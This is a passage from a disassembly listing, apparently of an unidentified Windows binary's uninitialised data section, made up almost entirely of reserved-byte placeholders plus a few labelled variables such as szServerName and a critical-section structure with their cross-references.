                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42C7A8    dd ?                    ; DATA XREF: sub_401E10+5C↑w
                                        ; sub_402A00+3F↑r ...
                align 10h
; const CHAR szServerName
szServerName    db ?                    ; DATA XREF: sub_401AE0+E6↑w
                                        ; sub_401AE0+1C8↑o ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42C8B0    dd ?                    ; DATA XREF: sub_408630+30↑o
                                        ; sub_408630:loc_40866A↑w ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42C8BC    dd ?                    ; DATA XREF: sub_403B80+14F↑r
                                        ; sub_403B80:loc_403CF2↑r ...
dword_42C8C0    dd ?                    ; DATA XREF: sub_403B80+149↑r
                                        ; sub_408630+45↑w ...
dword_42C8C4    dd ?                    ; DATA XREF: sub_408630+4B↑w
                                        ; sub_4086A0:loc_4086B3↑r ...
dword_42C8C8    dd ?                    ; DATA XREF: sub_4027B0:loc_40284F↑r
                                        ; sub_41F230+10↑o ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42C8D8    dd ?                    ; DATA XREF: sub_4027B0+116↑r
                                        ; sub_408F30:loc_408F82↑r ...
dword_42C8DC    dd ?                    ; DATA XREF: sub_4027B0+149↑r
                                        ; sub_408F30+2A↑r ...
dword_42C8E0    dd ?                    ; DATA XREF: sub_4027B0+8D↑r
                                        ; sub_4027B0+110↑r ...
dword_42C8E4    dd ?                    ; DATA XREF: sub_4027B0+7F↑r
                                        ; sub_4027B0+102↑r ...
; struct _RTL_CRITICAL_SECTION CriticalSection
CriticalSection _RTL_CRITICAL_SECTION <?>
                                        ; DATA XREF: sub_4027B0+70↑o
                                        ; sub_4027B0:loc_402925↑o ...
unk_42C900      db    ? ;               ; DATA XREF: sub_40BD30+95↑o
                                        ; sub_40BD30+B8↑o ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
unk_42C91C      db    ? ;               ; DATA XREF: sub_40BD30+DD↑o
                                        ; sub_40BD30+F3↑o ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
unk_42C938      db    ? ;               ; DATA XREF: sub_40BD30+118↑o
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
byte_42C93F     db ?                    ; DATA XREF: sub_40BAD0+26↑w
                                        ; sub_40BAD0+37↑r ...
byte_42C940     db ?                    ; DATA XREF: sub_40BAD0+96↑o
                                        ; sub_40BAD0:loc_40BBB0↑r ...
byte_42C941     db ?                    ; DATA XREF: sub_40BAD0+E7↑r
                                        ; sub_40BAD0+184↑w
byte_42C942     db ?                    ; DATA XREF: sub_40BAD0+FA↑r
                                        ; sub_40BAD0+198↑w
byte_42C943     db ?                    ; DATA XREF: sub_40BAD0+101↑r
                                        ; sub_40BAD0+19E↑w
                align 20h
byte_42C960     db ?                    ; DATA XREF: sub_40BAD0+C5↑o
                                        ; sub_40BAD0+D1↑o ...
byte_42C961     db ?                    ; DATA XREF: sub_40BAD0+F4↑w
                                        ; sub_40BAD0+177↑r
byte_42C962     db ?                    ; DATA XREF: sub_40BAD0+108↑w
                                        ; sub_40BAD0+18A↑r
byte_42C963     db ?                    ; DATA XREF: sub_40BAD0+10E↑w
                                        ; sub_40BAD0+191↑r
                align 20h
byte_42C980     db ?                    ; DATA XREF: sub_40BF20+87↑o
                                        ; sub_40BF20+9C↑o ...
byte_42C981     db ?                    ; DATA XREF: sub_40BF20+B5↑w
                                        ; sub_40C090+7↑o
byte_42C982     db ?                    ; DATA XREF: sub_40BF20+C0↑w
byte_42C983     db ?                    ; DATA XREF: sub_40BF20+CB↑w
byte_42C984     db ?                    ; DATA XREF: sub_40BF20+D6↑w
byte_42C985     db ?                    ; DATA XREF: sub_40BF20+E1↑w
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
unk_42C9B0      db    ? ;               ; DATA XREF: sub_40BAD0+CA↑o
                                        ; sub_40BAD0+121↑o ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42C9D0    dd ?                    ; DATA XREF: sub_416946+5↑r
                                        ; sub_416976+2BC↑r ...
; LPVOID lpMem
lpMem           dd ?                    ; DATA XREF: sub_416946+B↑r
                                        ; sub_416976+2CA↑r ...
dword_42C9D8    dd ?                    ; DATA XREF: sub_40FDE3+13↑r
                                        ; sub_40FEFC+6C↑r ...
dword_42C9DC    dd ?                    ; DATA XREF: sub_416976+2FE↑w
                                        ; sub_417125:loc_41716B↑r ...
dword_42C9E0    dd ?                    ; DATA XREF: sub_416C8C↑r
                                        ; sub_416C8C:loc_416CC1↑w
dword_42C9E4    dd ?                    ; DATA XREF: sub_416976+22B↑r
                                        ; sub_416976+24B↑r ...
dword_42C9E8    dd ?                    ; DATA XREF: sub_40FD55+13↑r
                                        ; sub_40FE32:loc_40FE6D↑r ...
dword_42C9EC    dd ?                    ; DATA XREF: sub_40F9F0+28↑r
                                        ; sub_413520+1E↑r ...
; UINT uNumber
uNumber         dd ?                    ; DATA XREF: sub_413E86+3E↑r
                                        ; sub_414448+35↑r ...
                align 10h
dword_42CA00    dd ?                    ; DATA XREF: sub_40F3C7+86↑r
                                        ; sub_40F3C7+FB↑o ...
                align 100h
; LPVOID dword_42CB00
dword_42CB00    dd ?                    ; DATA XREF: sub_4135A0+29↑w
                                        ; sub_4135A0+42↑w ...
                align 20h
unk_42CB20      db    ? ;               ; DATA XREF: .data:off_425800↑o
                                        ; .data:00425808↑o
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
